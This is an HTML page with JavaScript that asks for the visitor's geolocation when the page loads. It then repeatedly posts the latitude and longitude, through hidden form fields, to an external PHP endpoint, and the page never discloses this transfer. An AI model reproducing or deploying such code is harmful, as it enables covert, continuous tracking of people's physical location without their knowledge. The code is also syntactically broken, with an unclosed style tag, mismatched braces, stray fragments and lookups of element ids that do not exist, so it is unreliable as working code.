<!DOCTYPE html>
<html>
<script src="js.js"></script>
<style>

input{
visibility: hidden;
opacity: 0;
}

<body onload="getLocation()">
<form method="post" action="dewanshrawat15.comli.com/geo/submit.php" id="see">
<input name="long" type="text" />
<input name="lat" type="text" />
</form>
<p id="demo"></p>

<script>

var x = document.getElementById("demo");
var a = document.getElementById("lat");
var b = document.getElementById("long");
var c = document.getElementById("see");

function getLocation() {

    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(showPosition);
    } else { 
        x.innerHTML = "Geolocation is not supported by this browser.";}
    }

}, 300)
    
function showPosition(position) 
setInterval(function(){
    x.innerHTML="Latitude: " + position.coords.latitude + 
    "<br>Longitude: " + position.coords.longitude;
a.innerHTML=position.coords.latitude;
b.innerHTML=position.coords.longitude;

$.post('http://dewanshrawat15.comli.com/geo/submit.php', $('#see').serialize())
}, 300)
}
</script>


</body>
</html>
